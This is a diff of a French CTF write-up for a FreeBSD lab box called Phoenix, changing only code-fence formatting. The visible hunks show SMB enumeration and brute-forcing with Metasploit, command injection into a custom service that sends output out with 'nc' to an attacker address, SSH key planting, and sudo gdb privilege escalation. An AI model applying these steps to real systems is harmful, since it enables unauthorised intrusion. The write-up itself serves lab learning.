@@ -10,7 +10,7 @@ C'est parti pour ce petit CTF de *WizardLabs* baptisé *Phoenix* et basé sur Fr
 
 Nmap nous trouve une poignée de ports ouverts :  
 
-```plain
+```
 22/tcp   open  ssh         OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
 80/tcp   open  http        Apache httpd 2.4.33 ((FreeBSD))
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
@@ -24,7 +24,7 @@ Sur le serveur Apache on ne trouve rien... absolument rien, c'est la cata :(
 
 Le port 2003 fait tourner un service custom :  
 
-```plain
+```
 $ ncat 10.1.1.12 2003 -v
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Connected to 10.1.1.12:2003.
@@ -82,7 +82,7 @@ Elegance
 
 Côté SMB on peut compter sur Metasploit ou enum4linux pour l'énumération. On voit bien un partage *scripts* mais on ne dispose pas d'accès :  
 
-```plain
+```
 [+] Attempting to map shares on 10.1.1.12
 //10.1.1.12/scripts Mapping: DENIED, Listing: N/A
 //10.1.1.12/IPC$    [E] Can't understand response:
@@ -90,7 +90,7 @@ Côté SMB on peut compter sur Metasploit ou enum4linux pour l'énumération. On
 
 Il semble aussi qu'il y ait un utilisateur *tom* sur le système :  
 
-```plain
+```
  ====================================================================
 |    Users on 10.1.1.12 via RID cycling (RIDS: 500-550,1000-1050)    |
  ====================================================================
@@ -108,7 +108,7 @@ Il fallait finalement se mettre à brute-forcer le compte SMB de root. Mais là 
 
 En bref pour du brute-force SMB privilégiez Metasploit ou Medusa :  
 
-```plain
+```
 msf5 auxiliary(scanner/smb/smb_login) > run
 
 [*] 10.1.1.12:445         - 10.1.1.12:445 - Starting SMB login bruteforce
@@ -146,7 +146,7 @@ Etna
 
 On peut désormais accéder à ce partage SMB (mais pas au compte SSH petits malins) :  
 
-```plain
+```
 $ smbclient -U root -I 10.1.1.12 //phoenix/scripts
 WARNING: The "syslog" option is deprecated
 mkdir failed on directory /var/run/samba/msg.lock: Permission non accordée
@@ -180,7 +180,7 @@ if  "tom33094" in (data) :
 
 La fonction *execute()* appelle *os.system()*. On peut donc faire exécuter des commandes sans obtenir l'output, à moins de relayer via le *netcat* présent sur la machine :  
 
-```plain
+```
 Username ? tom33094
 Welcome Tom ! String ? whoami | nc 10.254.0.29 9999
 ```
@@ -189,7 +189,7 @@ Cette exécution de commande est suffisante pour ajouter notre clé publique SSH
 
 il faut tout de même si prendre à plusieurs fois car le script lit 1024 octets seulement pour obtenir la commande (on fait d'abord le *mkdir* puis plus tard l'écriture).  
 
-```plain
+```
 $ ssh tom@10.1.1.12
 Last login: Wed Jun 13 19:09:32 2018 from 192.168.0.29
 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 04:10:47 UTC 2017
@@ -225,7 +225,7 @@ Phoenix
 
 On aurait pu trouver facilement notre chemin vers root mais *LinEnum.sh* m'a mâché le travail :  
 
-```plain
+```
 [+] We can sudo without supplying a password!
 User tom may run the following commands on Phoenix:
     (ALL) NOPASSWD: /usr/bin/gdb
@@ -235,7 +235,7 @@ On peut s'en remettre à [gtfobins](https://gtfobins.github.io/gtfobins/gdb/) po
 
 RTFM for fun and profit :p  
 
-```plain
+```
 (gdb) help
 List of classes of commands:
 
